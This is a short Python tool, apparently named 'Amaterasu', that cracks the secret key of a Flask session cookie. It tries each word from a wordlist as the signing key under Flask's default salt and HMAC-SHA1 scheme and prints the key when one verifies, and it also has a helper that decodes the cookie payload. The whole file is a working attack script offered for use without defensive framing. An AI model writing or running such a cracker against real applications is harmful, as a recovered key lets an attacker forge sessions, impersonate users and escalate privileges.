# Amaterasu by Crucifery
import base64
import hashlib
import os
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, BadSignature, TimestampSigner
from tqdm import tqdm


def decode(cookies):
    data = cookies.split(".")
    decoding = base64.urlsafe_b64decode(data[0])
    decode_str = decoding.decode('utf-8')
    print(decode_str)

def wordlist_charge(wordlist_path):
    if not os.path.exists(wordlist_path):
        print("Error wordlist path doesn't exist")
        exit()

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        wordlist = [line.strip() for line in f]
        print(f"Wordlist is ready, {len(wordlist)} words")
        return wordlist

def bruteforce(cookies, wordlist):
    for key in tqdm(wordlist, desc="Brute-forcing...."):
            serializer = URLSafeTimedSerializer(secret_key=key, salt="cookie-session", serializer=TaggedJSONSerializer(),signer=TimestampSigner, signer_kwargs={'key_derivation': 'hmac','digest_method': hashlib.sha1})
            try:
                serializer.loads(cookies)
                print(f"[+] KEY = {key}")
                break
            except BadSignature:
                pass


def main():

    cookies = input("Enter your flask cookies : ")
    wordlist_path = input("Enter your wordlist path : ")
    wd = wordlist_charge(wordlist_path)

    #decode(cookies)
    bruteforce(cookies, wd)

if __name__ == '__main__':
    main()
